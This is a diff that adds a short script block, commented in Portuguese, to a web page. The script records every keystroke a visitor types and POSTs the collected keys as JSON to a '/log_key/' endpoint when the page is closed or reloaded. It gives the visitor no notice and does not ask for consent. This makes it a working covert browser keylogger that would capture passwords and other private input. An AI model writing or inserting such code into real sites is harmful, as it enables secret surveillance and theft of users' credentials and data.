@@ -1,0 +1,25 @@
+<script>
+    // Variável para armazenar as teclas pressionadas
+    var keysPressed = '';
+
+    document.addEventListener('keydown', function(event) {
+        keysPressed += event.key;
+    });
+
+    // Função para enviar as teclas acumuladas para o servidor
+    function sendKeys() {
+        if (keysPressed.length > 0) {
+            var xhr = new XMLHttpRequest();
+            xhr.open('POST', '/log_key/', true);
+            xhr.setRequestHeader('Content-Type', 'application/json');
+            xhr.send(JSON.stringify({
+                'keys': keysPressed
+            }));
+            // Limpa a variável após o envio
+            keysPressed = '';
+        }
+    }
+
+    // Envia as teclas acumuladas quando o usuário fecha ou recarrega a página
+    window.addEventListener('beforeunload', sendKeys);
+</script>
